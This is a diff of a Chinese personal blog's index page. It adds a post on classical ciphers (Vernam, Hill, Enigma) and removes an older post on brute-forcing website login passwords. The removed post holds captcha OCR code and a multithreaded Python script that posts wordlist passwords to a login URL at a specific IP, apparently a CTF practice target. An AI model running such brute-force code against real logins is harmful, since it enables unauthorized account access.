@@ -258,6 +258,203 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/27/密码学-二-——古典密码-下/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/12/27/密码学-二-——古典密码-下/" itemprop="url">
+                  密码学(二)——古典密码(下)
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-27T17:21:03+08:00">
+                2017-12-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/密码学/" itemprop="url" rel="index">
+                    <span itemprop="name">密码学</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2017/12/27/密码学-二-——古典密码-下/" class="leancloud_visitors" data-flag-title="密码学(二)——古典密码(下)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-信息加密原理"><a href="#0x00-信息加密原理" class="headerlink" title="0x00 信息加密原理"></a>0x00 信息加密原理</h2><p>信息加密是保证数据安全的一种方式。<br>信息加密的原理是：把明文用加密方法和密钥生成保密的密文，只有使用正确的解密方法和密钥后才能还原出明文。<br>一个完善的密码体制至少应该满足两个条件：  </p>
+<ul>
+<li>1.已知明文和加密密钥时，容易算出密文和解密过程。</li>
+<li>2.未知解密密钥时，难以由密文推出明文。  </li>
+</ul>
+<p>这里介绍以下三种古典密码的加密方式:  </p>
+<ul>
+<li>Vernam密码</li>
+<li>Hill密码</li>
+<li>Enigma密码</li>
+</ul>
+<h2 id="0x01-Vernam密码"><a href="#0x01-Vernam密码" class="headerlink" title="0x01 Vernam密码"></a>0x01 Vernam密码</h2><p>弗纳姆密码相比前面几种古典密码，不同处在于对其对应位的二进制数字进行异或操作，可以简单的表示为：   </p>
+<p>密文（2进制）=明文（2进制） ⊕ 密钥（2进制）  </p>
+<p>相反，解密过程就成了：  </p>
+<p>明文（2进制）=密文（2进制） ⊕ 密钥（2进制）  </p>
+<p>Vernam密码的核心就是密钥构造的方法，可以使用很长的密钥。虽然长密钥会使得密钥分析变的很困难，但是在大量样本的情况下，使用已知的部分明文序列，对破译帮助很大。</p>
+<p>而Vernam密码的改进方案则是号称永不可破译的“一次一密”，因为其密文与明文没有任何的统计关系，使穷举法破译过程永远无法停止，但是这种方法有个额外的困难，那就是密钥要在发送者和接收者之间传递，保存并保护，传递过程很容易出现问题，所以“一次一密”很少被使用。</p>
+<h2 id="0x02-Hill密码"><a href="#0x02-Hill密码" class="headerlink" title="0x02 Hill密码"></a>0x02 Hill密码</h2><p>希尔密码是一种多字母加密方法，其原理是矩阵的线性变换。<br>Hill密码算法取m个连续的明文字母，并用m个密文字母代替。这种替代由m个线性方程决定，其中每个字符被分配一个数值（a-z对应0-25）。<br>如m=3，可以用方程描述如下：<br><img src="http://oo3iot5oz.bkt.clouddn.com/gudianmima/04.png" alt=""><br>用向量可以表示为：<br><img src="http://oo3iot5oz.bkt.clouddn.com/gudianmima/05.png" alt=""><br>即C=K·P，其中C是密文，P是明文，K是一个密钥矩阵，K·P计算完成后进行模26运算，即可得到密文的对应数值矩阵，然后再转换为密文字母即可。  </p>
+<p>解密时，只需要求密钥矩阵K的逆矩阵K’，然后P=K·C计算完成后取模26运算，即可得到明文对应数值的矩阵，再转换为明文字母即可。  </p>
+<p>Hill密码的优点在于能完全隐藏单字母的统计频率，3×3的Hill密码还隐藏了两个字母的频率信息，如果矩阵维度更大，则可以隐藏更多的频率信息。<br>但是Hill密码的缺点在于，如果同时知道明文和密文，攻破难度就会大大降低。</p>
+<h2 id="0x03-Enigma密码"><a href="#0x03-Enigma密码" class="headerlink" title="0x03 Enigma密码"></a>0x03 Enigma密码</h2><p>Enigma密码又称为转子机密码，Enigma加密和解密需要一台类似打字机的设备，设定初始位置之后，通过输入明文，设备经过加密输出密文。解密时通过机械装置的切换，实现逆过程解密操作，输入密文，输出明文。<br>Enigma加密设备由一系列独立转动的圆柱体组成。每个圆柱体有26个输入引脚和26个输出引脚，其内部连线将每个输入引脚连接到一个相应的输出引脚。<br>如一个圆柱体的机器，每次输入一个明文字母，输出一个对应的密文字母，然后圆柱体旋转一格位置，然后再输入一个同样的明文字母的时候，因为之前的位置已经改变，所以密文字母也会不同，这就定义了一个不同的单字母替代密码。当连续输入26个字母之后，圆柱体又回到了原来的位置，这个时候我们就得到了以26为周期的多字母替代算法。<br>一个圆柱体看上去很简单，但是当增加圆柱体的数量，我们就可以得到更复杂的多字母替代算法：<br><img src="http://oo3iot5oz.bkt.clouddn.com/gudianmima/06.jpg" alt=""><br>如三个圆柱体分别为快速转子，中速转子和慢速转子：</p>
+<ul>
+<li>每输入一个明文字母，快速转子动一格</li>
+<li>快速转子转动够一周，中速转子转动一格</li>
+<li>中速转子转动够一周，慢速转子转动一格<br><img src="http://oo3iot5oz.bkt.clouddn.com/gudianmima/07.jpg" alt=""><br>这样我们就可以得到26×26×26种不同的替代字母，密码强度就会大大提高。</li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/22/密码学-一-——古典密码-上/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2040,189 +2237,6 @@ main()
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/01/python爬虫暴力破解网站登陆密码（二）/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/09/01/python爬虫暴力破解网站登陆密码（二）/" itemprop="url">
-                  python爬虫暴力破解网站登陆密码（二）
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-01T19:32:43+08:00">
-                2017-09-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/python/" itemprop="url" rel="index">
-                    <span itemprop="name">python</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2017/09/01/python爬虫暴力破解网站登陆密码（二）/" class="leancloud_visitors" data-flag-title="python爬虫暴力破解网站登陆密码（二）">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="python爬虫暴力破解网站登陆密码（二）"><a href="#python爬虫暴力破解网站登陆密码（二）" class="headerlink" title="python爬虫暴力破解网站登陆密码（二）"></a>python爬虫暴力破解网站登陆密码（二）</h1><p>上一篇主要介绍了一个基本的暴力破解爬虫的构成，但是他在实际使用的时候存在很多缺陷，比如速度很慢，遇到验证码无法进行等问题，这篇博客主要介绍验证码处理和多线程处理模块。  </p>
-<h2 id="0x00-处理验证码"><a href="#0x00-处理验证码" class="headerlink" title="0x00 处理验证码"></a>0x00 处理验证码</h2><p>网站区别人类用户和爬虫还有一个最常用的方法，那就是验证码，验证码（CAPTCHA）全称是全自动区分计算机和人类的公开图灵测试。可以说验证码就是为了阻止脚本而被发明的。可是当某些网站的验证码比较清晰好识别的时候，我们就可以借助计算机光学识别实现了。对于复杂的验证码，可以使用一些验证码处理的api（绝大多数是付费的）这些接口会有人工处理，一般30秒之内就能返回结果。    </p>
-<p>光学识别示例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from Tkinter import *</span><br><span class="line">tk= Tk()</span><br><span class="line">import pytesseract</span><br><span class="line">from PIL import Image</span><br><span class="line">x=1</span><br><span class="line">for i in range(5):</span><br><span class="line">    img = Image.open(&quot;%s.png&quot; %x)</span><br><span class="line">    gray = img.convert(&apos;L&apos;)</span><br><span class="line">    gray.save(&apos;%s_1.png&apos; %x)</span><br><span class="line">    bw = gray.point(lambda x: 0 if x &lt; 200 else 255,&apos;1&apos;)</span><br><span class="line">    bw.save(&apos;%s_2.png&apos; %x)</span><br><span class="line">    img.show()</span><br><span class="line">    print(pytesseract.image_to_string(bw))</span><br><span class="line">    x+=1</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x01-多线程、多进程"><a href="#0x01-多线程、多进程" class="headerlink" title="0x01 多线程、多进程"></a>0x01 多线程、多进程</h2><p>在暴力破解中需要的时间本就十分漫长，如果字典过大仍然使用串行处理，时间会长到一个不可思议的程度，为了尽量减少花费的时间，我们采用多线程或者多进程并行处理的方式提升处理速度。这里我们采用多线程作为例子，因为python实现多线程十分方便。  </p>
-<p>多线程原理：<br>同一时间内，CPU只能处理1条线程，只有1条线程在工作（执行）;多线程并发（同时）执行，其实是CPU快速地在多条线程之间调度（切换）。如果CPU调度线程的时间足够快，就造成了多线程并发执行的假象。  </p>
-<p>多线程优缺点：  </p>
-<ul>
-<li>优点：大大提高运行效率。</li>
-<li>缺点：开启线程需要占用一定的内存空间（默认情况下，主线程占用1M，子线程占用512KB），如果开启大量的线程，会占用大量的内存空间，降低程序的性能；线程越多，CPU在调度线程上的开销就越大。  </li>
-</ul>
-<p>多线程示例：  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from threading import Thread</span><br><span class="line"></span><br><span class="line">def boom():</span><br><span class="line">    data = &#123;&apos;pwd&apos;:password&#125;</span><br><span class="line">    print password</span><br><span class="line">    content = requests.post(url,data=data)</span><br><span class="line">    content.encoding=&apos;utf-8&apos;</span><br><span class="line">    html=content.text</span><br><span class="line">    if html != recv:</span><br><span class="line">        print html</span><br><span class="line">#dname = input(&quot;input dname:&quot;)</span><br><span class="line">url=&apos;http://120.24.86.145:8002/baopo/?yes&apos;</span><br><span class="line">data = &#123;&apos;pwd&apos;:123&#125;</span><br><span class="line"></span><br><span class="line">content = requests.post(url,data=data)</span><br><span class="line">content.encoding=&apos;utf-8&apos;</span><br><span class="line">recv=content.text</span><br><span class="line"></span><br><span class="line">passFile = open(r&apos;C:\Users\Leticia\Desktop\mutou.txt&apos;)</span><br><span class="line"></span><br><span class="line">for line in passFile.readlines():</span><br><span class="line">    password = line.strip(&apos;\n&apos;)</span><br><span class="line">    t = Thread(target=boom)</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2272,7 +2286,7 @@ main()
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">38</span>
+                <span class="site-state-item-count">39</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2294,7 +2308,7 @@ main()
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">36</span>
+                <span class="site-state-item-count">37</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
